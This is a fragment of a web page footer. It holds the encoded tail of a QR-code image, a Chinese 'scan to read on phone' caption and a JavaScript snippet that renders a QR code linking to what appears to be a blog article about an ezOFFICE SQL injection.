HD9PtoE47SucbRm4T77n7dd1OZzXmbdeVBfVC9VESO/KVai/i1Vb8WpdeStm/spVnOW3gZwll/b9J3AYCOSughFnW6tJ70OfGrzWB+Kz/gohfjjirNY99Tykh3r3QfLqIkS3DsJhRPPWyUX1wsNANC38mRP46wOpKVdA7pK6rvDHg+jyylXIO0L8ECzvVdhDH6QWgl2Xi9Z3hNR33TrRfOeQevMQDg/86wNxsYW/dwJ/PBDIdF0ewvvdIRf1z1CfqA/SH46oZ4b2gtR2H4w6hFvX/XKID4LqM4S5748HMlt06b93AoeBeDd0nLXXN8urw3hXXNVB/BC0T6+TF+oRIbWVq1DvCOe+qqmA5K2DkZenwnxdV8jF0q7iMBCLF/7MCWwDgUwdnuNsm5A67wAIh6B1EA5Bdeve5ZA+8EB7ifDIwePfaZl3TRHil4v6RXWIf6Z3n1yE1APr3/bePuy1PSEftq//7Hb+BwAA//+kzn97AAAABklEQVQDAMzMgLmbcsaXAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-name\_judge-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 